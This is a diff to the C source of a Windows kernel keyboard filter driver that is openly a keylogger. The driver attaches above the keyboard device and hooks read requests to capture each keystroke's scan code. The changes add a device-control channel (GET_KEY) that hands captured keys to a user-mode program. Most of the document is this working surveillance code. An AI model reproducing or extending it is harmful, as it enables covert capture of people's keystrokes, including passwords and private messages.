@@ -1,12 +1,24 @@
 #include <initguid.h>
 #include <wdm.h>
 #include <ntddkbd.h>
-
-#include "deviceExtension.h"
 #include "info.h"
 #include "ioCtls.h"
 
 #pragma warning(disable: 5045) //Disable Spectre
+
+#define DEVICE_PATH \
+	_T("\\Device\\") DEVICE_NAME
+
+#define SYMBOLIC_LINK_NAME \
+	_T("\\DosDevices\\") DEVICE_NAME
+
+typedef struct _DEVICE_EXTENSION
+{
+	PDEVICE_OBJECT pTargetDeviceObject;
+	UNICODE_STRING symbolicLinkName;
+	PIRP pIrpKey;
+
+} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
 
 VOID
 UnloadRoutine(
@@ -31,6 +43,19 @@ IrpForwarding(
 }
 
 NTSTATUS
+CompleteIrp(
+	PIRP pIrp,
+	NTSTATUS ntStatus,
+	ULONG info)
+{
+	pIrp->IoStatus.Status = ntStatus;
+	pIrp->IoStatus.Information = info;
+
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return ntStatus;
+}
+
+NTSTATUS
 HookCompletionRoutine(
 	PDEVICE_OBJECT pDeviceObject,
 	PIRP pIrp,
@@ -39,12 +64,17 @@ HookCompletionRoutine(
 	UNREFERENCED_PARAMETER(pContext);
 	ObfDereferenceObject(pDeviceObject);
 
-	if (NT_SUCCESS(pIrp->IoStatus.Status))
+	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
+	if (NT_SUCCESS(pIrp->IoStatus.Status) && pDeviceExtension->pIrpKey)
 	{
 		PKEYBOARD_INPUT_DATA keyInfo = pIrp->AssociatedIrp.SystemBuffer;
-
 		if (!keyInfo->Flags)
-			DbgPrint("KeyLogger: %hu", keyInfo->MakeCode);
+		{
+			PUSHORT pSysBuff = pDeviceExtension->pIrpKey->AssociatedIrp.SystemBuffer;
+			*pSysBuff = keyInfo->MakeCode;
+			CompleteIrp(pDeviceExtension->pIrpKey, STATUS_SUCCESS, sizeof(USHORT));
+			pDeviceExtension->pIrpKey = NULL;
+		}
 	}
 
 	if (pIrp->PendingReturned)
@@ -74,39 +104,42 @@ HookRoutine(
 	return IoCallDriver(pDeviceExtencion->pTargetDeviceObject, pIrp);
 }
 
-NTSTATUS
-CompleteIrp(
-	PIRP pIrp,
-	NTSTATUS ntStatus,
-	ULONG info)
-{
-	pIrp->IoStatus.Status = ntStatus;
-	pIrp->IoStatus.Information = info;
-
-	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
-	return ntStatus;
-}
 
 NTSTATUS
 DeviceControlRoutine(
 	PDEVICE_OBJECT pDeviceObject,
 	PIRP pIrp)
 {
-	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
 	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
 	ULONG controlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
-	ULONG bytesSnd = 0;
 
-	switch (controlCode)
+	if (controlCode == GET_KEY)
 	{
-		case GET_KEY:
-		{
-			//KeWaitForMutexObject(&pDeviceExtension->mutex, Executive, KernelMode, FALSE, NULL);
-			break;
-		}
+		IoMarkIrpPending(pIrp);
+		PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
+		pDeviceExtension->pIrpKey = pIrp;
+		return STATUS_PENDING;
 	}
 
-	return CompleteIrp(pIrp, STATUS_SUCCESS, bytesSnd);
+	return CompleteIrp(pIrp, STATUS_INVALID_PARAMETER, 0);
+}
+
+NTSTATUS
+CreateFileRoutine(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp)
+{
+	UNREFERENCED_PARAMETER(pDeviceObject);
+	return CompleteIrp(pIrp, STATUS_SUCCESS, 0);
+}
+
+NTSTATUS
+CloseFileRoutine(
+	PDEVICE_OBJECT pDeviceObject,
+	PIRP pIrp)
+{
+	UNREFERENCED_PARAMETER(pDeviceObject);
+	return CompleteIrp(pIrp, STATUS_SUCCESS, 0);
 }
 
 NTSTATUS
@@ -120,6 +153,8 @@ DriverEntry(
 		pDriverObject->MajorFunction[i] = IrpForwarding;
 
 	pDriverObject->MajorFunction[IRP_MJ_READ] = HookRoutine;
+	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CreateFileRoutine;
+	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateFileRoutine;
 	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlRoutine;
 	pDriverObject->DriverUnload = UnloadRoutine;
 
@@ -127,12 +162,13 @@ DriverEntry(
 	PDEVICE_OBJECT pDeviceObject;
 
 	UNICODE_STRING deviceName;
-	RtlInitUnicodeString(&deviceName, DEVICE_NAME);
+	RtlInitUnicodeString(&deviceName, DEVICE_PATH);
 
 	returnedStatus = IoCreateDevice(
 		pDriverObject,
 		sizeof(DEVICE_EXTENSION),
-		&deviceName, FILE_DEVICE_KEYBOARD,
+		&deviceName,
+		FILE_DEVICE_KEYBOARD,
 		0, FALSE,
 		&pDeviceObject);
 	
@@ -152,24 +188,8 @@ DriverEntry(
 		IoDeleteDevice(pDeviceObject);
 		return returnedStatus;
 	}
-
-	UNICODE_STRING targetDeviceName;
-	RtlInitUnicodeString(&targetDeviceName, symLinks);
-
+	
 	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
-	ExFreePool(symLinks);
-
-	returnedStatus = IoAttachDevice(
-		pDeviceObject,
-		&targetDeviceName,
-		&pDeviceExtension->pTargetDeviceObject);
-
-	if (!NT_SUCCESS(returnedStatus))
-	{
-		IoDeleteDevice(pDeviceObject);
-		return returnedStatus;
-	}
-
 	RtlInitUnicodeString(&pDeviceExtension->symbolicLinkName, SYMBOLIC_LINK_NAME);
 
 	returnedStatus = IoCreateSymbolicLink(
@@ -182,8 +202,21 @@ DriverEntry(
 		return returnedStatus;
 	}
 
-	//KeInitializeGuardedMutex(&pDeviceExtension->mutex);
-	//KeAcquireGuardedMutex(&pDeviceExtension->mutex);
+	UNICODE_STRING targetDeviceName;
+	RtlInitUnicodeString(&targetDeviceName, symLinks);
+	ExFreePool(symLinks);
+
+	returnedStatus = IoAttachDevice(
+		pDeviceObject,
+		&targetDeviceName,
+		&pDeviceExtension->pTargetDeviceObject);
+
+	if (!NT_SUCCESS(returnedStatus))
+	{
+		IoDeleteSymbolicLink(&pDeviceExtension->symbolicLinkName);
+		IoDeleteDevice(pDeviceObject);
+		return returnedStatus;
+	}
 
 	return returnedStatus;
 }
